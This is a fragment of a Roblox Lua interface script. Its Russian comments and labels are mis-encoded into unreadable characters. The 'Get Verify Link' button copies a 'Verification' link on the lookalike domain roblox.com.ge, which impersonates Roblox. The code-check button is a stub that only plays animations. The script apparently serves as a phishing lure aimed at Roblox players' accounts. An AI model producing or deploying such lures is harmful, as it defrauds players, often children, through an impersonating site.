    ):Play()
end)

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏
local function copyToClipboard(text)
    if setclipboard then
        setclipboard(text)
        
        -- –í—Ä–µ–º–µ–Ω–Ω–æ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞ –∫–Ω–æ–ø–∫–∏
        local originalText = linkButton.Text
        linkButton.Text = "–°—Å—ã–ª–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞!"
        
        -- –ê–Ω–∏–º–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ–≥–æ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è
        game:GetService("TweenService"):Create(
            linkButton,
            TweenInfo.new(0.3),
            {BackgroundColor3 = Color3.fromRGB(70, 180, 100)}
        ):Play()
        
        wait(1.5)
        
        -- –í–æ–∑–≤—Ä–∞—â–∞–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –≤–∏–¥
        linkButton.Text = originalText
        game:GetService("TweenService"):Create(
            linkButton,
            TweenInfo.new(0.3),
            {BackgroundColor3 = Color3.fromRGB(60, 60, 65)}
        ):Play()
    else
        -- –ï—Å–ª–∏ setclipboard –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        linkButton.Text = "–°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å—Å—ã–ª–∫—É –≤—Ä—É—á–Ω—É—é"
        wait(1.5)
        linkButton.Text = "Get Verify Link"
    end
end

-- –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ Get Verify Link
linkButton.MouseButton1Click:Connect(function()
    local verifyLink = "https://roblox.com.ge/games/11852808844/Verification?privateServerLinkCode=69155647945445362618402496055839"
    copyToClipboard(verifyLink)
end)

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–¥–∞ (–∑–∞–≥–ª—É—à–∫–∞)
checkButton.MouseButton1Click:Connect(function()
    local code = textBox.Text
    
    if code == "" then
        -- –ê–Ω–∏–º–∞—Ü–∏—è –æ—à–∏–±–∫–∏
        game:GetService("TweenService"):Create(
            inputFrame,
            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true),
            {BackgroundColor3 = Color3.fromRGB(180, 60, 60)}
        ):Play()
        
        -- –í—Ä–µ–º–µ–Ω–Ω–æ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞ –∫–Ω–æ–ø–∫–∏
        local originalText = checkButton.Text
        checkButton.Text = "–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥!"
        
        wait(1)
        checkButton.Text = originalText
    else
        -- –ê–Ω–∏–º–∞—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏
        game:GetService("TweenService"):Create(
            checkButton,
            TweenInfo.new(0.3),
            {BackgroundColor3 = Color3.fromRGB(70, 180, 100)}
        ):Play()
        
        local originalText = checkButton.Text
        checkButton.Text = "–ü—Ä–æ–≤–µ—Ä–∫–∞..."
        
        -- –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å —Ä–µ–∞–ª—å–Ω—É—é –ª–æ–≥–∏–∫—É –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–¥–∞
        wait(1.5)
        
        checkButton.Text = originalText
        game:GetService("TweenService"):Create(
            checkButton,
            TweenInfo.new(0.3),
            {BackgroundColor3 = Color3.fromRGB(80, 130, 255)}
        ):Play()
    end
end)

